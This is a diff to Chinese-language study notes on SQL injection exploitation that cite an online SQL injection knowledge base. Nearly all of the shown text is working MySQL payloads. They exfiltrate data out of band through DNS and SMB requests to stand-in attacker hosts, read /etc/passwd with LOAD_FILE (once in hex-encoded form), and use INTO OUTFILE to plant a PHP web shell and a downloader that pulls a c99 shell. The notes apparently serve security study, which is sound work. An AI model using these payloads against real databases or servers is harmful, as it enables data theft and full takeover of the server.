@@ -51,18 +51,18 @@ test.get_content() #获取第一列第一个字段内容
 [SQLi漏洞的各种具体利用方式【漏洞危害】 - The SQL Injection Knowledge Base](https://websec.ca/kb/sql_injection#MySQL_Writing_Files)
 
 * 数据泄露 - 带外通道得到数据(Out Of Band Channeling)
-  * DNS Requests
+  * DNS Requests - `LOAD_FILE`可以发出DNS请求
     * `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\'));`
-  * SMB Requests
+  * SMB Requests - `INTO OUTFILE`可以发出SMB请求
     * `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
 * 读取文件内容(Reading Files) Files can be read if the user has FILE privileges.
   * LOAD_FILE()
     * `SELECT LOAD_FILE('/etc/passwd');`
     * `SELECT LOAD_FILE(0x2F6574632F706173737764);`
 * 写入文件(Writing Files) Files can be created if the user has FILE privileges.
-  * `INTO OUTFILE` `INTO DUMPFILE`
-    * PHP shell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` access `http://localhost/shell.php?c=cat%20/etc/passwd`
-    * PHP downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` access `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
+  * `INTO OUTFILE` 或 `INTO DUMPFILE`
+    * Get WebShell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` 访问WebShell `http://localhost/shell.php?c=cat%20/etc/passwd`
+    * Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
 
 
 ### 防御方法
